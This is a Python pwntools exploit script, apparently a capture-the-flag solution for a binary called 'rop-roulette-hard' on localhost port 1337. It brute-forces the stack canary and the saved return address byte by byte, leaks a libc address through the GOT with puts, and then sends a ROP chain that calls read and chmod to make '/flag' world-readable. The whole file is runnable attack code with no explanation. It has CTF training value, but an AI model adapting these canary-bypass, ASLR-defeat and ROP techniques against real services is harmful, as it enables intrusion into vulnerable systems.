#!/usr/bin/python3

from pwn import *
import re
import time

context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF("/challenge/rop-roulette-hard")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rbp = 0x7ff12345678
ret = rbp + 8
canary_add = rbp - 8
input_start = rbp - 0x50 
offset = canary_add - input_start


def get_canary():
    payload = b"a" * offset + b"\x00"
    for i in range(7):
        for j in range(256):
            try:
                io = remote("127.0.0.1",1337)
                payload += j.to_bytes(1,"little")
                io.send(payload)
                data = io.recvall().decode()
            except:
                data = io.clean(timeout = 0.05).decode()
            finally:
                io.close()
            if "*** stack smashing detected ***" not in  data:
                break
            payload = payload[:-1]
    return int.from_bytes(payload[offset:],"little")

def get_pie(canary):
    payload = b"a" * offset + p64(canary) + b"a"* 8
    for _ in range(8):
        for i in range(256):
            try:
                io = remote("127.0.0.1",1337) 
                payload += i.to_bytes(1,"little")
                io.send(payload)
                data = io.recvall(timeout=0.05).decode()
            except:
                data = io.clean(timeout = 0.05).decode()
            finally:
                io.close()
            if "### Goodbye!" in data:
                break
            payload = payload[:-1]
    pie_base = int.from_bytes(payload[offset+16:],"little") - 0x1726
    return pie_base

def get_libc(canary):
    rop_elf = ROP(elf)
    pop_rdi = rop_elf.find_gadget(["pop rdi","ret"]).address
    ret = rop_elf.find_gadget(["ret"]).address
    payload = b"a" * offset + p64(canary) + b"b" * 8 + p64(pop_rdi) + p64(elf.got.puts) + p64(ret) + p64(elf.sym.puts)
    io = remote("127.0.0.1",1337)
    io.send(payload)
    data = io.recvall(timeout = 0.05)[:-1][-6:]
    return int.from_bytes(data,"little") - libc.sym.puts
if __name__ == "__main__":
    canary = get_canary()
    pie_base = get_pie(canary)
    elf.address = pie_base
    libc_base = get_libc(canary)
    libc.address = libc_base

    rop_elf = ROP(elf)
    rop_libc = ROP(libc)

    pop_rdi = rop_elf.find_gadget(['pop rdi','ret']).address
    pop_rsi = rop_elf.find_gadget(['pop rsi','pop r15','ret']).address
    pop_rdx = rop_libc.find_gadget(['pop rdx','pop r12','ret']).address
    ret  = rop_elf.find_gadget(['ret']).address

    payload = b"a" * offset + p64(canary) + b"a" * 8
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi) + p64(elf.bss()+0x300) + p64(0)
    payload += p64(pop_rdx) + p64(10) + p64(0)
    payload += p64(ret)
    payload += p64(elf.sym.read)
    payload += p64(pop_rdi) + p64(elf.bss() + 0x300)
    payload += p64(pop_rsi) + p64(511) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.chmod)

    io = remote('127.0.0.1',1337)
    io.send(payload)
    time.sleep(1)
    io.send(b"/flag\x00")
    io.interactive()
